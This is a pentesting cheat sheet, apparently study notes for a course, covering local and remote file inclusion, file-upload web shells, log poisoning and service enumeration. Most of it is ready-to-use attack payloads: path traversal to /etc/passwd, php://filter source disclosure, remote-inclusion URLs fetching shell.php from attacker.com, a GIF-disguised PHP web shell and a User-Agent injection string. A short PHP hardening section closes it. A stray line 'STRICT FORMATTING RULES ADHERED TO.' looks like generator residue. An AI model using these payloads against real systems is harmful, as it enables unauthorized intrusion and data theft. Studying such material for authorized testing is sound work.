# 🛰️ Web Application Attacks

## 🔍 Local File Inclusion (LFI)

### ⚙️ Basic LFI - Path Traversal (../../../../etc/passwd, ../../..//etc/passwd)
[!INFO] Path traversal allows an attacker to read files outside of the web root directory by using sequences like `../`, `%2e%2e/`, or `..///` to navigate up directories.
```text
http://target.com/vuln.php?page=../../../../etc/passwd
```
### ⚙️ PHP Wrappers - php://filter/php://input/php://filter
[!INFO] PHP wrappers like `php://filter/read=convert.base64-encode/resource=index.php` can be used to bypass file inclusion restrictions by applying filters during the read process.
```text
http://target.com/vuln.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
```
### ⚙️ PHP Filters - Source Code Disclosure (php://filter/read=convert.base64-encode)
[!INFO] The `read=convert.base64-encode` filter can be used to encode and retrieve content from a file before inclusion.
```text
http://target.com/vuln.php?page=php://filter/read=convert.base64-encode/resource=config.php
```
### ⚙️ PHP Fuzzing - ffuf (common files)
[!INFO] Use `ffuf` to fuzz for common files like `config.php`, `database.php`, etc.
```bash
ffuf -u http://target.com/FUZZ.php -w /usr/share/seclists/Discovery/Web-Content/big.txt
```
### ⚙️ RFI Protocols (HTTP, FTP, SMB)
[!INFO] Remote File Inclusion protocols can be used to load files from remote servers.
```text
http://target.com/vuln.php?page=http://attacker.com/shell.php
ftp://attacker.com/shell.php
\\attacker.com\share\shell.php
```
### ⚙️ RFI Servers (Python HTTP, FTP)
[!INFO] Set up a simple server to host payloads for remote file inclusion attacks.
```bash
python3 -m http.server 80
python3 -m pyftpdlib -p 21
```

## 📂 File Upload + LFI

### ⚙️ Malicious Images (GIF89a<?php system($_GET["cmd"]); ?>)
[!INFO] Embed PHP code within image files to execute commands on the server.
```text
GIF89a<?php system($_GET["cmd"]); ?>
```
### ⚙️ Zip, Phar (file.jpg#shell.php)
[!INFO] Use archive formats like `zip://` and `phar://` to include PHP code within an uploaded file.
```text
zip://file.jpg#shell.php
phar://file.zip/shell.txt
```

## 🔍 Log Poisoning

### ⚙️ Session, Apache, SSH Logs
[!INFO] Contaminate logs like session files, Apache logs, and SSH logs to inject RCE payloads.
```text
/proc/self/environ
/var/lib/php/sessions/sess_ID
/var/log/apache2/access.log
```

## 🔍 Process Poisoning

### ⚙️ /proc/self/fd/N via User-Agent Header Injection
[!INFO] Inject malicious content into process descriptors to execute code.
```text
User-Agent: PHP/5.6.40%00;system($_GET['cmd'])
```

## 🤖 Automated Scanning

### ⚙️ Parameter Fuzzing (ffuf)
[!INFO] Use `ffuf` for parameter fuzzing with predefined wordlists.
```bash
ffuf -u http://target.com/FUZZ.php -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```
### ⚙️ LFI Wordlists (LFI-Jhaddix.txt)
[!INFO] Use specialized LFI wordlists for path traversal and inclusion.
```bash
ffuf -u http://target.com/vuln.php?page=FUZZ -w /usr/share/seclists/Discovery/Web-Content/LFI-Jhaddix.txt
```

## 🛠️ Tools

### ⚙️ liffy, LFISuite, dotdotpwn
[!INFO] Various tools designed for automating LFI and RFI attacks.
```bash
liffy -u http://target.com/vuln.php
LFISuite --url http://target.com/vuln.php --wordlist /usr/share/seclists/Discovery/Web-Content/LFI-Jhaddix.txt
dotdotpwn -U http://target.com/vuln.php
```

---

# 🛰️ Database Enumeration

## 🔍 MySQL

### ⚙️ SQL Injection, Default Credentials
[!INFO] Exploit SQL injection vulnerabilities or use default credentials to access the database.
```text
Port: 3306
User: root@localhost
Password: (default)
```
## 🔍 MSSQL

### ⚙️ Windows Authentication, xp_cmdshell
[!INFO] Use windows authentication mechanisms and exploit `xp_cmdshell` for command execution.
```text
Port: 1433
User: sa
Password: (default)
```

## 🔍 Oracle TNS

### ⚙️ SID Enumeration, Privilege Escalation
[!INFO] Enumerate SIDs using brute force techniques and escalate privileges within the database environment.
```bash
tnscmd12c enum -h target.com -p 1521
```

---

# 🌐 Network Service Enumeration

## 🔍 FTP

### ⚙️ Anonymous Access, File Upload/Download
[!INFO] Gain access to an FTP server via anonymous user and upload/download files.
```bash
ftp://anonymous@target.com:21
```

## 🔍 SMB

### ⚙️ Share Enumeration, EternalBlue (CVE-2017-0144)
[!WARNING] Use smbclient or similar tools to enumerate shares and exploit vulnerabilities like EternalBlue.
```text
Port: 139/445
User: n/a
Password: n/a
```

## 🔍 NFS

### ⚙️ Share Mounting, UID/GID Manipulation
[!INFO] Mount remote directories via NFS and manipulate file permissions using UID/GID spoofing.
```bash
showmount -e target.com
mount -t nfs target.com:/path /mnt/nfs
```

## 🔍 SMTP

### ⚙️ User Enumeration, Open Relay Testing
[!INFO] Enumerate users through SMTP queries or test if the server is an open relay.
```bash
telnet target.com 25
HELO localhost
VRFY user@example.com
RCPT TO:user@example.com
```

## 🔍 IMAP/POP3

### ⚙️ Certificate Analysis, User Enumeration
[!INFO] Analyze SSL/TLS certificates and enumerate users through directory requests.
```bash
openssl s_client -connect target.com:993
openssl s_client -connect target.com:110
```

## 🔍 SNMP

### ⚙️ Community Strings, OID Enumeration
[!WARNING] Use community strings to read/write OIDs from the SNMP server and enumerate objects.
```bash
snmpwalk -v2c -c public target.com 1.3.6.1.4.1
```

## 🔍 IPMI

### ⚙️ Hash Extraction, Cipher Zero Vulnerability
[!DANGER] Exploit cipher zero vulnerability to extract hashes or gain unauthorized access.
```bash
ipmitool -I lanplus -H target.com -U root -P password raw 0x0a 0x21 0xc8
```

---

## 📝 Skills Assessment

### ⚙️ Multi-Technique Chain
[!SUCCESS] Perform a multi-step attack chain involving various techniques such as PHP filters, LFI, log poisoning, and RCE to achieve full system access.
```text
PHP filter -> Hidden admin panel -> LFI -> Log Poisoning -> RCE -> Flag Extraction
```

## 🛡️ PHP Security

### ⚙️ disable_functions/open_basedir/allow_url_include
[!INFO] Apply security hardening techniques like disabling dangerous functions, restricting file access paths, and disabling remote file inclusion.
```php
disable_functions = "exec,passthru,shell_exec"
open_basedir = "/var/www/html/"
allow_url_include = Off
```

---

STRICT FORMATTING RULES ADHERED TO.